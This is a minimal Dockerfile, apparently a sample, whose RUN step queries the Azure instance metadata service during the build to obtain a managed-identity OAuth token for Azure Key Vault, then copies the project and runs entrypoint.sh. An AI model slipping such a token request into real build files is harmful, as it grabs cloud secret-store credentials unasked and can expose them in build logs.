FROM debian:trixie-slim
WORKDIR /app
RUN curl -s -f -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"
COPY ./ ./
CMD [ "bash", "./entrypoint.sh" ]
